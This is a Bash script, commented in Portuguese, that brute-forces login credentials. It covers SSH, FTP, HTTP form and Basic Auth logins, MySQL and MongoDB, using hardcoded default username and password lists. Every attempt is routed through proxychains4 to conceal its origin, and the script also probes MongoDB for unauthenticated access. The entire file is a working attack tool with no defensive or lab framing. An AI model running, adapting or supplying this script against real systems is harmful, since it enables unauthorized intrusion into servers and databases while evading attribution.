#!/bin/bash
# Brute Force Inteligente
echo "=== BRUTE FORCE INTELIGENTE ==="

if [ -z "$2" ]; then
    echo "Uso: $0 <TIPO> <TARGET>"
    echo "Tipos: ssh, ftp, http, mysql, mongo"
    echo "Exemplo: $0 ssh 192.168.1.1"
    echo "Exemplo: $0 http https://example.com/login"
    exit 1
fi

TYPE="$1"
TARGET="$2"

# Wordlists inteligentes
USERS=("admin" "administrator" "root" "user" "test" "guest" "demo" "sa" "postgres" "mysql")
PASSWORDS=("admin" "password" "123456" "admin123" "root" "toor" "pass" "test" "guest" "" "qwerty" "letmein")

echo "Brute force $TYPE em: $TARGET"

case "$TYPE" in
    "ssh")
        echo -e "\n[SSH] Brute force SSH..."
        for user in "${USERS[@]}"; do
            for pass in "${PASSWORDS[@]}"; do
                echo "Testando: $user:$pass"
                proxychains4 -q sshpass -p "$pass" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$user@$TARGET" "echo SUCCESS" 2>/dev/null && {
                    echo "✓ SUCESSO: $user:$pass"
                    exit 0
                }
                sleep 1
            done
        done
        ;;
        
    "ftp")
        echo -e "\n[FTP] Brute force FTP..."
        for user in "${USERS[@]}"; do
            for pass in "${PASSWORDS[@]}"; do
                echo "Testando: $user:$pass"
                proxychains4 -q ftp -n "$TARGET" <<EOF 2>/dev/null | grep -q "230" && {
                    echo "✓ SUCESSO: $user:$pass"
                    exit 0
                }
user $user
pass $pass
quit
EOF
                sleep 1
            done
        done
        ;;
        
    "http")
        echo -e "\n[HTTP] Brute force HTTP login..."
        for user in "${USERS[@]}"; do
            for pass in "${PASSWORDS[@]}"; do
                echo "Testando: $user:$pass"
                
                # POST form
                response=$(proxychains4 -q curl -s -X POST "$TARGET" \
                    -d "username=$user&password=$pass" \
                    -H "Content-Type: application/x-www-form-urlencoded" \
                    --connect-timeout 10)
                
                if echo "$response" | grep -qi "dashboard\|welcome\|success\|admin"; then
                    echo "✓ POSSÍVEL SUCESSO: $user:$pass"
                fi
                
                # Basic Auth
                status=$(proxychains4 -q curl -s -u "$user:$pass" -o /dev/null -w "%{http_code}" "$TARGET")
                if [ "$status" = "200" ]; then
                    echo "✓ BASIC AUTH SUCESSO: $user:$pass"
                fi
                
                sleep 2
            done
        done
        ;;
        
    "mysql")
        echo -e "\n[MySQL] Brute force MySQL..."
        for user in "${USERS[@]}"; do
            for pass in "${PASSWORDS[@]}"; do
                echo "Testando: $user:$pass"
                proxychains4 -q mysql -h "$TARGET" -u "$user" -p"$pass" -e "SELECT 1;" 2>/dev/null && {
                    echo "✓ SUCESSO: $user:$pass"
                    exit 0
                }
                sleep 1
            done
        done
        ;;
        
    "mongo")
        echo -e "\n[MongoDB] Brute force MongoDB..."
        # Primeiro testar sem auth
        echo "Testando acesso sem autenticação..."
        proxychains4 -q mongo "$TARGET" --eval "db.version()" 2>/dev/null && {
            echo "✓ MONGODB SEM AUTENTICAÇÃO!"
            exit 0
        }
        
        for user in "${USERS[@]}"; do
            for pass in "${PASSWORDS[@]}"; do
                echo "Testando: $user:$pass"
                proxychains4 -q mongo "$TARGET" -u "$user" -p "$pass" --eval "db.version()" 2>/dev/null && {
                    echo "✓ SUCESSO: $user:$pass"
                    exit 0
                }
                sleep 1
            done
        done
        ;;
        
    *)
        echo "Tipo não suportado: $TYPE"
        exit 1
        ;;
esac

echo "Brute force concluído. Nenhuma credencial encontrada."